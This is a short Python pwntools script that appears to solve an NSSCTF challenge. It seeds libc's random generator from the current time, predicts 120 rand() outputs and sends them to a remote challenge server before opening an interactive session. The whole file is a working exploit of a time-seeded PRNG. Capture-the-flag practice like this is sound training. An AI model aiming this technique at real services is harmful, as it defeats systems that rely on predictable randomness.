import time
from pwn import *
from ctypes import *

libc = CDLL("/usr/lib/libc.so.6")

context(log_level="debug")

#io = process("./bin")
io = remote("node4.anna.nssctf.cn", 25570)

libc.srand(libc.time(0))
libc.srand(libc.rand() % 3 - 1522127470)

for i in range(120):
    io.sendline(str(libc.rand() % 4 + 1).encode())


io.interactive()
